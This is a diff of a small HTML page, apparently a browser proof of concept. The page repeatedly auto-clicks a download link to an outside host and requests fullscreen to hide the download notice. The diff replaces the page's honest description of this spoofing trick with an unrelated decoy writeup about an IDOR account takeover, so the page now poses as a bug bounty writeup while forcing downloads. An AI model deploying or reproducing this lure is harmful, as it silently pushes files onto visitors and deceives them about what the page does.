@@ -1,17 +1,21 @@
 <html>
 <body>
-    <h1>Klik kanan dan open window in new windows untuk membaca writeup PoC bug bounty hunting saya.</h1>
-    <a id='aid' style="opacity:1" target="_blank" onclick="javascript:document.body.requestFullscreen();" href='https://cr.kungfoo.net/yao/downloads/multiple/redirect_download.php' download>redirect</a>
+    <h1>To read my bug bounty writeup right click then open new window</h1>
+    <a id='aid' style="opacity:1" targe="_blank" onclick="javascript:document.body.requestFullscreen();" href='https://cr.kungfoo.net/yao/downloads/multiple/redirect_download.php' download>redirect</a>
 </body>
 <script>
-var w = setInterval(function(){ document.getElementById("aid").click(); }, 3000);
-var x = setInterval(v, 3700);
-
-function v(){  
-    document.write("<h2>Writeup: Fullscreen API UI Spoofing</h2><p><strong>Vulnerability:</strong> Hiding download notifications using Fullscreen mode.</p><p><strong>Steps to reproduce:</strong> Trigger fullscreen simultaneously with a file download.</p><p><strong>Impact:</strong> Users are unaware of the downloaded file.</p><p>Status: PoC Successful.</p>"); 
-    clearInterval(x);
-    // window.stop()
-}
-//setInterval(function(){ document.body.requestFullscreen(); }, 2000);
+    var w = setInterval(function() { 
+        document.getElementById("aid").click(); 
+    }, 3000);
+    
+    var x = setInterval(v, 3700);
+    
+    function v() {  
+        document.write("<h2>Bug Bounty Writeup: Account Takeover via IDOR</h2><p><strong>Description:</strong> Discovered an Insecure Direct Object Reference (IDOR) vulnerability on the password reset endpoint.</p><p><strong>Impact:</strong> Critical. An attacker could bypass authorization checks and reset the password of any user by simply modifying the user_id parameter in the POST request, leading to full account takeover.</p><p><strong>Status:</strong> Reported, Triaged, and Rewarded.</p>"); 
+        clearInterval(x);
+        // window.stop()
+    }
+    
+    //setInterval(function(){ document.body.requestFullscreen(); }, 2000);
 </script>
 </html>
